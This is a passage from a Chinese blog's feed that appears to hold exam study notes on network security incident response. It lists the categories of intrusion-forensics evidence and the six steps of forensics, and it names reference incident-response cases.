title="入侵取证"></a>入侵取证</h2><p>证据信息分为两大类：实时信息或易失信息、非易失信息</p><p>可作为证据或证据关联的信息有：</p><ul><li>日志</li><li>文件，如文件大小、内容、创建日期、交换文件等</li><li>系统进程</li><li>用户，如在线用户的服务时间、使用方式</li><li>系统状态</li><li>网络通信连接记录</li><li>磁盘介质</li></ul><p>网络安全取证6个步骤：</p><ol><li>取证现场保护</li><li>识别证据</li><li>传输证据</li><li>保存证据</li><li>分析证据</li><li>提交证据</li></ol><h1 id="网络安全应急响应参考案例"><a href="#网络安全应急响应参考案例" class="headerlink" title="网络安全应急响应参考案例"></a>网络安全应急响应参考案例</h1><p>公共互联网网络安全突发事件应急预案、阿里云安全应急响应服务、IBM产品安全漏洞应急响应、“永恒之蓝”攻击的紧急处置、页面篡改事件处置规程详见P370-P377</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网络安全应急响应概述&quot;&gt;&lt;a href=&quot;#网络安全应急响应概述&quot; class=&quot;headerlink&quot; title=&quot;网络安全应急响应概述&quot;&gt;&lt;/a&gt;网络安全应急响应概述&lt;/h1&gt;&lt;p&gt;对网络安全事件进行监测、预警、分析、响应和恢复等工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/法律要求.jpg&quot; style=&quot;zoom:50%;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
